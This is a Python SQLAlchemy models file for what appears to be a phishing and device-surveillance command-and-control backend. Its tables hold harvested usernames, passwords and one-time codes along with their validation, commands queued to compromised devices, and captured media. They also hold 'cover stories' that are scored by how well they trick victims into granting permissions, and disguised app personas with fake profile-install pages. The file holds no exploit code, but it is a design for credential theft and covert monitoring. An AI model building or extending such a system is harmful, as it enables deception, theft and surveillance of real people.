from sqlalchemy import String, Integer, Boolean, Text, DateTime, ForeignKey
from sqlalchemy.orm import Mapped, mapped_column, relationship
from sqlalchemy.sql import func
from datetime import datetime
from typing import Optional
from backend.database import Base


class HarvestConfig(Base):
    __tablename__ = "harvest_configs"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    target_name: Mapped[str] = mapped_column(String(256))
    login_html: Mapped[str] = mapped_column(Text, default="")
    validation_url: Mapped[Optional[str]] = mapped_column(Text)
    validation_method: Mapped[str] = mapped_column(String(8), default="POST")
    otp_enabled: Mapped[bool] = mapped_column(Boolean, default=False)
    otp_timeout: Mapped[int] = mapped_column(Integer, default=120)
    chain_next_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("harvest_configs.id"), nullable=True)


class Campaign(Base):
    __tablename__ = "campaigns"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    name: Mapped[str] = mapped_column(String(256))
    description: Mapped[Optional[str]] = mapped_column(Text)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    device_ids_json: Mapped[str] = mapped_column(Text, default="[]")


class CoverStory(Base):
    __tablename__ = "cover_stories"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    permission_type: Mapped[str] = mapped_column(String(64))
    title: Mapped[str] = mapped_column(String(256))
    body: Mapped[str] = mapped_column(Text)
    success_count: Mapped[int] = mapped_column(Integer, default=0)
    fail_count: Mapped[int] = mapped_column(Integer, default=0)


class Device(Base):
    __tablename__ = "devices"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    name: Mapped[str] = mapped_column(String(256))
    user_agent: Mapped[Optional[str]] = mapped_column(Text)
    fingerprint_hash: Mapped[Optional[str]] = mapped_column(String(64))
    first_seen: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    last_seen: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    push_subscription: Mapped[Optional[str]] = mapped_column(Text)
    current_version: Mapped[Optional[str]] = mapped_column(String(64))
    ip_history_json: Mapped[str] = mapped_column(Text, default="[]")
    harvest_config_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("harvest_configs.id"), nullable=True)
    campaign_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("campaigns.id"), nullable=True)
    engagement_score: Mapped[int] = mapped_column(Integer, default=0)
    events: Mapped[list["Event"]] = relationship("Event", back_populates="device", lazy="select")
    commands: Mapped[list["Command"]] = relationship("Command", back_populates="device", lazy="select")
    credentials: Mapped[list["Credential"]] = relationship("Credential", back_populates="device", lazy="select")
    media_items: Mapped[list["MediaItem"]] = relationship("MediaItem", back_populates="device", lazy="select")
    permission_requests: Mapped[list["PermissionRequest"]] = relationship("PermissionRequest", back_populates="device", lazy="select")


class Event(Base):
    __tablename__ = "events"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    device_id: Mapped[int] = mapped_column(Integer, ForeignKey("devices.id"))
    type: Mapped[str] = mapped_column(String(64))
    data_json: Mapped[str] = mapped_column(Text, default="{}")
    delta_hash: Mapped[Optional[str]] = mapped_column(String(64))
    timestamp: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    device: Mapped["Device"] = relationship("Device", back_populates="events")


class Command(Base):
    __tablename__ = "commands"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    device_id: Mapped[int] = mapped_column(Integer, ForeignKey("devices.id"))
    type: Mapped[str] = mapped_column(String(64))
    payload_json: Mapped[str] = mapped_column(Text, default="{}")
    status: Mapped[str] = mapped_column(String(32), default="pending")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    executed_at: Mapped[Optional[datetime]] = mapped_column(DateTime, nullable=True)
    device: Mapped["Device"] = relationship("Device", back_populates="commands")


class Credential(Base):
    __tablename__ = "credentials"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    device_id: Mapped[int] = mapped_column(Integer, ForeignKey("devices.id"))
    type: Mapped[str] = mapped_column(String(32), default="credential")
    username: Mapped[Optional[str]] = mapped_column(String(256))
    password: Mapped[Optional[str]] = mapped_column(Text)
    otp: Mapped[Optional[str]] = mapped_column(String(32))
    validated: Mapped[bool] = mapped_column(Boolean, default=False)
    validation_result: Mapped[Optional[str]] = mapped_column(Text)
    harvest_config_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("harvest_configs.id"), nullable=True)
    data_json: Mapped[Optional[str]] = mapped_column(Text, nullable=True)
    timestamp: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    device: Mapped["Device"] = relationship("Device", back_populates="credentials")


class MediaItem(Base):
    __tablename__ = "media"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    device_id: Mapped[int] = mapped_column(Integer, ForeignKey("devices.id"))
    type: Mapped[str] = mapped_column(String(32))
    file_path: Mapped[str] = mapped_column(Text)
    timestamp: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    size_bytes: Mapped[int] = mapped_column(Integer, default=0)
    device: Mapped["Device"] = relationship("Device", back_populates="media_items")


class PermissionRequest(Base):
    __tablename__ = "permission_requests"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    device_id: Mapped[int] = mapped_column(Integer, ForeignKey("devices.id"))
    permission_type: Mapped[str] = mapped_column(String(64))
    cover_story_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("cover_stories.id"), nullable=True)
    requested_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    result: Mapped[str] = mapped_column(String(32))
    retry_count: Mapped[int] = mapped_column(Integer, default=0)
    operator_notes: Mapped[Optional[str]] = mapped_column(Text)
    device: Mapped["Device"] = relationship("Device", back_populates="permission_requests")


class User(Base):
    __tablename__ = "users"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    username: Mapped[str] = mapped_column(String(128), unique=True)
    password_hash: Mapped[Optional[str]] = mapped_column(Text)
    api_key: Mapped[Optional[str]] = mapped_column(String(64), unique=True)
    role: Mapped[str] = mapped_column(String(32), default="viewer")
    created_by: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("users.id"), nullable=True)
    last_login: Mapped[Optional[datetime]] = mapped_column(DateTime, nullable=True)
    is_active: Mapped[bool] = mapped_column(Boolean, default=True)
    needs_password_setup: Mapped[bool] = mapped_column(Boolean, default=False)


class AppVersion(Base):
    __tablename__ = "app_versions"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    version_hash: Mapped[str] = mapped_column(String(64), unique=True)
    bundle_json: Mapped[str] = mapped_column(Text, default="{}")
    published_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    is_current: Mapped[bool] = mapped_column(Boolean, default=False)


class Webhook(Base):
    __tablename__ = "webhooks"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    event_type: Mapped[str] = mapped_column(String(64))
    url: Mapped[str] = mapped_column(Text)
    secret: Mapped[Optional[str]] = mapped_column(String(64))
    is_active: Mapped[bool] = mapped_column(Boolean, default=True)


class ProbeLog(Base):
    __tablename__ = "probe_log"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    timestamp: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    ip: Mapped[Optional[str]] = mapped_column(String(64))
    user_agent: Mapped[Optional[str]] = mapped_column(Text)
    url: Mapped[Optional[str]] = mapped_column(Text)
    standalone: Mapped[Optional[bool]] = mapped_column(Boolean)
    extra_json: Mapped[str] = mapped_column(Text, default="{}")


class AppPersona(Base):
    __tablename__ = "app_personas"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    app_name: Mapped[str] = mapped_column(String(256))
    app_icon_b64: Mapped[Optional[str]] = mapped_column(Text)
    theme_json: Mapped[str] = mapped_column(Text, default="{}")
    content_type: Mapped[str] = mapped_column(String(64), default="news_feed")
    content_source: Mapped[Optional[str]] = mapped_column(Text)
    locale: Mapped[str] = mapped_column(String(8), default="he")
    is_default: Mapped[bool] = mapped_column(Boolean, default=False)


class WcTemplate(Base):
    __tablename__ = "wc_templates"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    name: Mapped[str] = mapped_column(String(256), default="New Template")
    description: Mapped[Optional[str]] = mapped_column(Text)
    is_default: Mapped[bool] = mapped_column(Boolean, default=False)
    app_name: Mapped[str] = mapped_column(String(256), default="App")
    app_icon_b64: Mapped[Optional[str]] = mapped_column(Text)
    ui_type: Mapped[str] = mapped_column(String(32), default="white")
    ui_html: Mapped[Optional[str]] = mapped_column(Text)
    theme_json: Mapped[str] = mapped_column(Text, default="{}")
    splash_json: Mapped[str] = mapped_column(Text, default='{"enabled":false,"title":"","subtitle":"","duration":1800}')
    install_page_json: Mapped[str] = mapped_column(Text, default='{"title":"Install","body":"Tap below to install","btn_label":"Install Profile","bg":"#f2f2f7","accent":"#007aff"}')
    onboarding_json: Mapped[str] = mapped_column(Text, default="[]")
    harvest_json: Mapped[str] = mapped_column(Text, default="[]")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    updated_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    targets: Mapped[list["WcTarget"]] = relationship("WcTarget", back_populates="template", lazy="select")


class WcTarget(Base):
    __tablename__ = "wc_targets"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    token: Mapped[str] = mapped_column(String(64), unique=True)
    label: Mapped[Optional[str]] = mapped_column(String(256))
    template_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("wc_templates.id"), nullable=True)
    device_id: Mapped[Optional[int]] = mapped_column(Integer, ForeignKey("devices.id"), nullable=True)
    first_seen: Mapped[Optional[datetime]] = mapped_column(DateTime, nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())
    template: Mapped[Optional["WcTemplate"]] = relationship("WcTemplate", back_populates="targets")


class WcFlow(Base):
    __tablename__ = "wc_flows"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    name: Mapped[str] = mapped_column(String(256), default="New Flow")
    description: Mapped[Optional[str]] = mapped_column(Text)
    steps_json: Mapped[str] = mapped_column(Text, default="[]")
    created_at: Mapped[datetime] = mapped_column(DateTime, default=func.now())


class WcFlowRun(Base):
    __tablename__ = "wc_flow_runs"
    id: Mapped[int] = mapped_column(Integer, primary_key=True)
    flow_id: Mapped[int] = mapped_column(Integer, ForeignKey("wc_flows.id"))
    device_id: Mapped[int] = mapped_column(Integer, ForeignKey("devices.id"))
    status: Mapped[str] = mapped_column(String(32), default="pending")
    current_step: Mapped[int] = mapped_column(Integer, default=0)
    started_at: Mapped[Optional[datetime]] = mapped_column(DateTime, nullable=True)
    completed_at: Mapped[Optional[datetime]] = mapped_column(DateTime, nullable=True)
